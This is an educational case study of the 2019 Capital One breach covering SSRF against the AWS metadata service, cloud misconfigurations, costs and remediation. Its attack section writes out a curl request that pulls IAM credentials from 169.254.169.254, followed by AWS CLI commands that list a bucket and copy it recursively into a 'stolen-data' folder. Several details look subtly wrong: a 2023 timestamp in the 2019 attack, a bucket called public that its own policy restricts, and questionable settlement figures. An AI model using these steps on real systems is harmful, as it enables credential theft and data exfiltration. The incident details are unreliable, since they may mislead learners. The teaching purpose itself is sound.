# 📌 **CASE STUDY 10: CAPITAL ONE DATA BREACH**
## Cloud Security - Misconfigured AWS S3 Bucket Analysis

---

## 🎯 **PROBLEM STATEMENT**
The Capital One data breach of 2019 exposed sensitive financial information of over 100 million customers due to a misconfigured AWS S3 storage bucket. This case study examines how cloud misconfigurations can lead to massive data breaches, highlighting the critical importance of cloud security best practices and shared responsibility models.

---

## 📋 **INCIDENT OVERVIEW**

### **What Happened**
- **Date**: July 2019 (discovered), breach occurred over months
- **Affected**: 106 million Capital One customers
- **Data Exposed**: Social Security numbers, bank account numbers, credit scores, transaction data
- **Attack Method**: SSRF (Server-Side Request Forgery) exploitation
- **Financial Impact**: $190 million settlement, significant legal costs
- **Perpetrator**: Paige Thompson (former AWS employee)

### **The Root Cause**
A misconfigured AWS WAF (Web Application Firewall) rule allowed an SSRF attack that accessed a vulnerable metadata service, which then provided access to an S3 bucket containing sensitive customer data.

---

## 🔍 **CLOUD SECURITY ANALYSIS**

### **AWS Architecture Overview**
```
Capital One AWS Environment:
├── EC2 Instances (Web Servers)
│   ├── Application Load Balancer
│   └── Auto Scaling Groups
├── S3 Buckets
│   ├── Public Website Assets
│   ├── Customer Data (MISCONFIGURED!)
│   └── Backup Storage
├── RDS Databases
│   ├── Customer Information
│   └── Transaction Data
├── CloudFront CDN
└── WAF (Web Application Firewall)
```

### **Vulnerable Configuration**
```json
// Misconfigured WAF Rule (Allowed SSRF)
{
  "Rules": [
    {
      "Name": "AllowMetadataAccess",
      "Priority": 1,
      "Action": {
        "Allow": {}
      },
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "AllowMetadataAccess"
      },
      "Statement": {
        "ByteMatchStatement": {
          "FieldToMatch": {
            "UriPath": {}
          },
          "PositionalConstraint": "STARTS_WITH",
          "SearchString": "/latest/meta-data/",
          "TextTransformations": [
            {
              "Priority": 0,
              "Type": "NONE"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 📊 **ATTACK TECHNIQUE ANALYSIS**

### **Server-Side Request Forgery (SSRF) Exploitation**

#### **Step 1: Initial Reconnaissance**
```bash
# Attacker identifies SSRF vulnerability in web application
# Crafts request to internal AWS metadata service
curl "https://capitalone.com/vulnerable-endpoint?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response reveals IAM role
{
  "Code": "Success",
  "LastUpdated": "2019-07-15T20:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "token..."
}
```

#### **Step 2: Privilege Escalation**
```bash
# Use IAM credentials to enumerate S3 buckets
aws s3 ls --profile compromised-role

# Discover misconfigured bucket
2023-07-15 20:30:00 capital-one-customer-data

# List bucket contents
aws s3 ls s3://capital-one-customer-data/ --profile compromised-role
```

#### **Step 3: Data Exfiltration**
```bash
# Download sensitive data
aws s3 cp s3://capital-one-customer-data/ ./stolen-data/ --recursive --profile compromised-role

# Files exposed:
# - ssn_data.csv (Social Security Numbers)
# - credit_scores.json (Credit Scores)
# - bank_accounts.xml (Account Numbers)
# - transaction_history.db (Transaction Data)
```

### **S3 Bucket Misconfiguration**
```json
// Vulnerable S3 Bucket Policy (Too Permissive)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::capital-one-customer-data/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "10.0.0.0/8"  // Only internal? But SSRF bypasses this!
        }
      }
    }
  ]
}
```

---

## 🛡️ **CLOUD SECURITY VIOLATIONS**

### **AWS Shared Responsibility Model Failures**

#### **AWS Responsibilities (Met)**
- ✅ Physical security of data centers
- ✅ Hypervisor security
- ✅ Network infrastructure security
- ✅ Hardware maintenance

#### **Customer Responsibilities (Failed)**
- ❌ Identity and Access Management (IAM)
- ❌ S3 bucket configuration and permissions
- ❌ Web Application Firewall (WAF) rules
- ❌ Security group configurations
- ❌ Monitoring and logging
- ❌ Encryption at rest and in transit

### **Specific Security Failures**
1. **Misconfigured WAF**: Allowed SSRF attacks to metadata service
2. **Over-privileged IAM Role**: Excessive S3 permissions
3. **Insecure S3 Bucket**: Public access to sensitive data
4. **Lack of Encryption**: Data stored unencrypted
5. **Insufficient Monitoring**: No intrusion detection
6. **Inadequate Segmentation**: No network isolation

---

## 💰 **FINANCIAL & REGULATORY IMPACT**

### **Direct Costs**
- **Settlement**: $190 million to FTC and CFPB
- **Legal Fees**: $80 million in legal expenses
- **Technical Remediation**: $50 million in security improvements
- **Credit Monitoring**: $150 million for affected customers
- **Regulatory Fines**: Additional penalties expected
- **Total Direct Costs**: $470 million+

### **Indirect Costs**
- **Stock Price Impact**: 6% decline in market value
- **Customer Churn**: Loss of customer trust
- **Competitive Disadvantage**: Increased scrutiny
- **Executive Changes**: CIO and CISO replacements
- **Insurance Premiums**: Significant increases

### **Regulatory Consequences**
- **FTC Settlement**: $80 million civil penalty
- **CFPB Settlement**: $110 million redress to customers
- **State AG Settlements**: Additional $25 million
- **Congressional Hearings**: Public testimony required
- **Ongoing Investigations**: Multiple regulatory probes

---

## 🔧 **TECHNICAL REMEDIATION**

### **Immediate Security Fixes**
```bash
# 1. Secure WAF Configuration
aws wafv2 create-rule \
  --name "BlockSSRF" \
  --scope "REGIONAL" \
  --action "Block" \
  --statement '{
    "ByteMatchStatement": {
      "FieldToMatch": {"UriPath": {}},
      "PositionalConstraint": "CONTAINS",
      "SearchString": "169.254.169.254"
    }
  }'

# 2. Fix S3 Bucket Permissions
aws s3api put-bucket-policy \
  --bucket capital-one-customer-data \
  --policy '{
    "Version": "2012-10-17",
    "Statement": []
  }'  # Remove public access

# 3. Enable S3 Block Public Access
aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration '{
    "BlockPublicAcls": true,
    "IgnorePublicAcls": true,
    "BlockPublicPolicy": true,
    "RestrictPublicBuckets": true
  }'
```

### **Long-term Cloud Security**
```bash
# 1. Implement Least Privilege IAM
aws iam create-policy \
  --policy-name "S3RestrictedAccess" \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::capital-one-customer-data/*",
        "Condition": {
          "StringEquals": {
            "aws:SourceVpc": "vpc-12345"
          }
        }
      }
    ]
  }'

# 2. Enable Encryption
aws s3api put-bucket-encryption \
  --bucket capital-one-customer-data \
  --server-side-encryption-configuration '{
    "Rules": [
      {
        "ApplyServerSideEncryptionByDefault": {
          "SSEAlgorithm": "AES256"
        }
      }
    ]
  }'

# 3. Configure CloudTrail & GuardDuty
aws cloudtrail create-trail \
  --name "security-trail" \
  --s3-bucket-name "security-logs-bucket" \
  --is-multi-region-trail

aws guardduty create-detector \
  --enable
```

---

## 📈 **CLOUD SECURITY LESSONS LEARNED**

### **AWS Security Best Practices**
1. **Principle of Least Privilege**: Minimal required permissions
2. **Defense in Depth**: Multiple security layers
3. **Zero Trust Architecture**: Never trust, always verify
4. **Infrastructure as Code**: Secure configurations by default
5. **Continuous Monitoring**: Real-time threat detection

### **Cloud Security Challenges**
1. **Shared Responsibility**: Understanding cloud provider vs. customer duties
2. **Configuration Drift**: Maintaining secure configurations at scale
3. **Third-Party Risks**: Supply chain and vendor security
4. **Data Sovereignty**: Compliance with regional regulations
5. **Cost Optimization**: Security vs. operational efficiency

### **Modern Cloud Security**
1. **Cloud Security Posture Management (CSPM)**: Automated compliance
2. **Cloud Access Security Brokers (CASB)**: Data protection
3. **Infrastructure as Code Security**: Pipeline security scanning
4. **Serverless Security**: Function-level security controls

---

## 🎓 **CLOUD SECURITY EDUCATION**

### **Essential Cloud Security Skills**
1. **Cloud Platform Expertise**: AWS, Azure, GCP security services
2. **Infrastructure as Code**: Terraform, CloudFormation security
3. **Container Security**: Docker, Kubernetes security
4. **API Security**: RESTful API protection
5. **Compliance Frameworks**: SOC 2, PCI DSS, HIPAA

### **Security Tools & Services**
1. **CSPM Tools**: Palo Alto Prisma Cloud, Check Point CloudGuard
2. **CASB Solutions**: Microsoft Cloud App Security, Netskope
3. **Container Security**: Aqua Security, Sysdig Secure
4. **IaC Security**: Checkov, Terrascan, tfsec

### **Monitoring & Response**
1. **SIEM Integration**: Cloud service log aggregation
2. **XDR Solutions**: Extended detection and response
3. **SOAR Platforms**: Security orchestration and automation
4. **Threat Intelligence**: Cloud-specific threat feeds

---

## 🔍 **DISCUSSION QUESTIONS**

1. **How did the shared responsibility model contribute to this breach?**
2. **What role did SSRF play in bypassing traditional security controls?**
3. **How have cloud providers improved security since this incident?**
4. **What are the challenges of securing data in cloud environments?**
5. **How do modern CSPM tools prevent these types of misconfigurations?**

---

## 🛠️ **CLOUD SECURITY TOOLS & TECHNIQUES**

### **Configuration Assessment**
```bash
# Scout Suite - Multi-cloud security auditing
python scout.py aws --profile compromised-role

# Prowler - AWS security best practices assessment
./prowler -p compromised-role

# Cloud Custodian - Policy as code
custodian run --output-dir ./results policy.yml
```

### **Vulnerability Scanning**
```bash
# AWS Inspector
aws inspector create-assessment-template \
  --assessment-target-arn arn:aws:inspector:us-east-1:123456789012:target/0-abc123 \
  --assessment-template-name "vulnerability-assessment"

# AWS Config Rules
aws config put-config-rule \
  --config-rule '{
    "ConfigRuleName": "s3-bucket-public-read-prohibited",
    "Source": {
      "Owner": "AWS",
      "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
    }
  }'
```

### **Monitoring & Alerting**
```bash
# AWS Security Hub
aws securityhub enable-security-hub

# Amazon GuardDuty
aws guardduty create-detector --enable

# AWS Config
aws config start-configuration-recorder \
  --configuration-recorder-name "security-recorder"
```

---

## 📚 **ADDITIONAL RESOURCES**

### **Official Reports**
- [Capital One Breach Settlement](https://www.ftc.gov/news-events/topics/identity-theft/capital-one-settlement)
- [CFPB Consent Order](https://www.consumerfinance.gov/about-us/newsroom/cfpb-orders-capital-one-to-pay-110-million-for-data-security-program-failures/)
- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)

### **Cloud Security Research**
- [AWS Well-Architected Framework](https://aws.amazon.com/architecture/well-architected/)
- [NIST Cloud Computing Security](https://csrc.nist.gov/publications/detail/sp/800-171/rev-2/final)
- [CSA Security Guidance](https://cloudsecurityalliance.org/research/guidance/)

### **Industry Standards**
- [ISO 27017 - Cloud Security](https://www.iso.org/standard/43757.html)
- [SOC 2 for Cloud Services](https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html)
- [FedRAMP Security Controls](https://www.fedramp.gov/)

---

## 🏆 **KEY LEARNING OBJECTIVES**

By studying this case, you will understand:
- ✅ AWS shared responsibility model and customer responsibilities
- ✅ Server-Side Request Forgery (SSRF) attack techniques
- ✅ S3 bucket security misconfigurations and remediation
- ✅ Cloud identity and access management (IAM) best practices
- ✅ Web Application Firewall (WAF) configuration and rules
- ✅ Cloud security monitoring and logging
- ✅ Data encryption in cloud environments
- ✅ Incident response in cloud environments
- ✅ Regulatory compliance for cloud data
- ✅ Modern cloud security tools and services

---

## 🔐 **CURRENT CLOUD SECURITY LANDSCAPE**

### **Evolving Threats**
- **Cloud Misconfigurations**: S3, storage account exposure
- **Supply Chain Attacks**: Container registry compromises
- **Identity-Based Attacks**: IAM privilege escalation
- **Data Exfiltration**: Advanced persistent threats in cloud

### **Security Solutions**
- **Cloud Security Posture Management (CSPM)**: Automated compliance
- **Cloud Workload Protection Platforms (CWPP)**: Runtime protection
- **Cloud Access Security Brokers (CASB)**: Data loss prevention
- **Secure Access Service Edge (SASE)**: Network security convergence

### **Industry Trends**
- **Zero Trust Cloud**: Identity-centric security
- **Infrastructure as Code Security**: Pipeline security scanning
- **Multi-Cloud Security**: Cross-platform protection
- **Serverless Security**: Function-level security controls

---

**Case Study Prepared By:** Cloud Security Research Team
**Date:** October 31, 2025
**Difficulty Level:** Advanced
**Real-World Impact:** Critical
**Industry Relevance:** Cloud Computing, Financial Services, AWS Security